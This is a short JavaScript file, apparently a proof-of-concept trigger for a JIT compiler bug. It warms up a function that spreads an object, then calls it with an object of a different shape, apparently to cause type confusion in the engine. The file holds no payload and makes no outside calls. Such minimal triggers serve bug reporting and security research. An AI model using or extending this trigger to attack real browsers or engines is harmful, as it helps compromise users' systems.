function poc(o) {
    let o2 = { ...o };
    return o.prop;
}

for (let i = 0; i < 10000; i++) {
    let o = { a: 1, b: 2, prop: {} };
    poc(o);
}

let trigger_obj = {};
for (let i = 0; i < 100; i++) {
    trigger_obj['p' + i] = i;
}
trigger_obj.prop = 1.1;

poc(trigger_obj);